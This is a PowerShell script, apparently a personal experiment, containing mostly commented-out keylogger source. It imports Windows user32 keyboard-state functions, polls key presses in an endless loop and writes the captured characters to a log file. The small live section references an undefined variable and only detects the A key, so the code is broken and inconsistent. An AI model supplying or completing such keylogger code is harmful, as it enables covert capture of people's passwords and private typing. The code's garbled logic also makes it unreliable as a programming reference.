# # Set-ExecutionPolicy "Unrestricted"

# #requires -Version 2
# function Start-KeyLogger($Path="$env:temp\keylogger.txt") 
# {
# #   # Signatures for API Calls
# #   $signatures = @'
# # [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
# # public static extern short GetAsyncKeyState(int virtualKeyCode); 
# # [DllImport("user32.dll", CharSet=CharSet.Auto)]
# # public static extern int GetKeyboardState(byte[] keystate);
# # [DllImport("user32.dll", CharSet=CharSet.Auto)]
# # public static extern int MapVirtualKey(uint uCode, int uMapType);
# # [DllImport("user32.dll", CharSet=CharSet.Auto)]
# # public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
# # '@

#   # load signatures and make members available
#   # $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru  
		
#   # create output file
#   # $null = New-Item -Path $Path -ItemType File -Force

#   try
#   {
#     Write-Host 'Recording key presses. Press CTRL+C to see results.' -ForegroundColor Red

#     # create endless loop. When user presses CTRL+C, finally-block
#     # executes and shows the collected key presses
#     while ($true) {
#       Start-Sleep -Milliseconds 40
			
#       # scan all ASCII codes above 8
#       for ($ascii = 97; $ascii -le 97; $ascii++) {
#         # get current key state
#         try {
#           $state = (GetAsyncKeyState(0x41)) & 0x01
#           Write-Host $state
#         }
#         catch {
#         }

#         # is key pressed?
#         # Write-Host $state
#         if ($state -eq -32767) {
#           $null = [console]::CapsLock
#           # Write-Host "here"

#           # translate scan code to real code
#           $virtualKey = $API::MapVirtualKey($ascii, 3)

#           # get keyboard state for virtual keys
#           $kbstate = New-Object Byte[] 256
#           $checkkbstate = $API::GetKeyboardState($kbstate)

#           # prepare a StringBuilder to receive input key
#           $mychar = New-Object -TypeName System.Text.StringBuilder

#           # translate virtual key
#           $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

#           if ($success) 
#           {
#             # add key to logger file
#             # [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode) 
#             # Write-Output
#             $OutputEncoding = [ System.Text.Encoding]::UTF8
#             # Write-Host $mychar
#           }
#         }
#       }
#     }
#   }
#   finally
#   {
#     # # open logger file in Notepad
#     # notepad $Path
#   }
# }

# # records all key presses until script is aborted by pressing CTRL+C
# # will then open the file with collected key codes
# Start-KeyLogger("C:/Users/vrdhn/Desktop/CS")

$API = Add-Type -MemberDefinition $signature -Name 'Keypress' -Namespace API -PassThru

while ($true) {
	if ($API::GetAsyncKeyState(0x41) -eq -32767) {
		Write-Output "h"
	}
}

# do
# {
#     # wait for a key to be available:
#     if ([Console]::KeyAvailable)
#     {
#         # read the key, and consume it so it won't
#         # be echoed to the console:
#         # $keyInfo = [Console]::ReadKey($true)
#         [Console]::ReadKey($false)
#         # # exit loop
#         # break
#     }

#     # write a dot and wait a second
#     Write-Host '.' -NoNewline
#     Start-Sleep -Seconds 0.1

# } while ($true)

# # emit a new line
# Write-Host

# # show the received key info object:
# $keyInfo